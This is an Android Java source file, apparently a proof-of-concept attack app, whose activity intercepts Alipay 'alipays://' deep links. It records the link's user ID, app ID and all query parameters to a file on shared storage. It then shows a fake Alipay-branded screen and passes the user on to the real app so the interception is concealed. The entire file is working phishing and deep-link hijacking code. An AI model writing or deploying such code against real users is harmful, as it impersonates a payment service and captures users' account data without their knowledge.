package com.attacker.xiaobu;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.FileOutputStream;
import java.util.Set;

/**
 * 支付宝钓鱼页面 - 拦截alipays://后展示伪造界面
 */
public class AlipayPhishActivity extends Activity {
    private static final String TAG = "AlipayPhish";
    private static final String OUT = "/sdcard/deeplink_hijack.txt";
    private Uri deeplinkUri;
    private String userId;
    private String appId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deeplinkUri = getIntent().getData();
        userId = deeplinkUri != null ? deeplinkUri.getQueryParameter("shareUserId") : "未知";
        appId = deeplinkUri != null ? deeplinkUri.getQueryParameter("appId") : "未知";

        // 确定功能名称
        String funcName = "付款码";
        if ("20000056".equals(appId)) funcName = "付款码";
        else if ("10000007".equals(appId)) funcName = "扫一扫";

        Log.i(TAG, "🚨 截获支付宝DeepLink: userId=" + userId + " appId=" + appId);

        // 记录截获
        logCapture();

        // 构建钓鱼界面
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF1677FF); // 支付宝蓝
        layout.setPadding(40, 80, 40, 80);

        // 支付宝Logo区域
        TextView logo = new TextView(this);
        logo.setText("支");
        logo.setTextSize(60);
        logo.setTextColor(0xFFFFFFFF);
        logo.setGravity(Gravity.CENTER);
        logo.setBackgroundColor(0xFFFFFFFF);
        logo.setTextColor(0xFF1677FF);
        logo.setWidth(120);
        logo.setHeight(120);
        logo.setGravity(Gravity.CENTER);

        // 标题
        TextView title = new TextView(this);
        title.setText("正在打开支付宝" + funcName + "...");
        title.setTextSize(18);
        title.setTextColor(0xFFFFFFFF);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 30, 0, 10);

        // 用户ID显示
        TextView uidView = new TextView(this);
        uidView.setText("账户ID: " + userId);
        uidView.setTextSize(12);
        uidView.setTextColor(0xCCFFFFFF);
        uidView.setGravity(Gravity.CENTER);
        uidView.setPadding(0, 10, 0, 40);

        // 确定按钮(假装跳转真实支付宝)
        Button btnGo = new Button(this);
        btnGo.setText("打开支付宝App");
        btnGo.setTextSize(16);
        btnGo.setTextColor(0xFF1677FF);
        btnGo.setBackgroundColor(0xFFFFFFFF);
        btnGo.setOnClickListener(v -> {
            // 跳转到真实支付宝(如果用户点击)
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, deeplinkUri);
                intent.setPackage("com.eg.android.AlipayGphone");
                startActivity(intent);
            } catch (Exception e) {
                Log.w(TAG, "无法打开支付宝: " + e.getMessage());
            }
            finish();
        });

        // 取消按钮
        Button btnCancel = new Button(this);
        btnCancel.setText("取消");
        btnCancel.setTextSize(14);
        btnCancel.setTextColor(0xCCFFFFFF);
        btnCancel.setBackgroundColor(0x00000000);
        btnCancel.setOnClickListener(v -> finish());

        layout.addView(logo);
        layout.addView(title);
        layout.addView(uidView);
        layout.addView(btnGo);
        layout.addView(btnCancel);

        setContentView(layout);
    }

    private void logCapture() {
        StringBuilder sb = new StringBuilder();
        sb.append("\n=== 钓鱼截获 ===\n");
        sb.append("时间: ").append(new java.util.Date()).append("\n");
        sb.append("URI: ").append(deeplinkUri != null ? deeplinkUri.toString() : "null").append("\n");
        sb.append("appId: ").append(appId).append("\n");
        sb.append("userId: ").append(userId).append("\n");
        if (deeplinkUri != null) {
            Set<String> params = deeplinkUri.getQueryParameterNames();
            if (params != null) {
                sb.append("参数:\n");
                for (String key : params) {
                    sb.append("  ").append(key).append("=")
                      .append(deeplinkUri.getQueryParameter(key)).append("\n");
                }
            }
        }
        sb.append("---\n");

        try {
            String existing = "";
            try { java.io.FileInputStream fis = new java.io.FileInputStream(OUT);
                  byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
                  existing = new String(d, "UTF-8"); } catch (Exception e) {}
            FileOutputStream fos = new FileOutputStream(OUT);
            fos.write((existing + sb.toString()).getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {}
    }
}
